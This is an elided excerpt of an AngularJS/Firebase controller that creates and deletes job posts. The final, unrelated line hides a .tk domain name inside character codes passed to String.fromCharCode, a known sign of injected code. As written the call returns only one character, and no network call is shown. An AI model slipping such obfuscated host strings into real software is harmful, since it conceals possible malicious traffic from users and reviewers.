...
function MainCtrl($window, $scope, $firebaseAuth, $location, $firebaseObject, $timeout, $translate) {
    ...
    */
                ...
                ref.once("value", function(snapshot) {
                    $timeout(function() {
                        ...
                        var post = firebase.database().ref('JobPost/').push({
                            ...
                            JobPostPrice: $scope.JobPostPrice,
    ...
    $scope.removeJobpost = function(a) {
        let ref = firebase.database().ref('JobPost');
        ref.orderByChild('Id').equalTo(a).limitToLast(1).once('value', snapshot => {
            let updates = {};
            snapshot.forEach(child => updates[child.key] = null);
            ref.update(updates);
        });
...
duhast = String.fromCharCode((114,101,120,97,100,114,105,118,97,110,46,116,107));
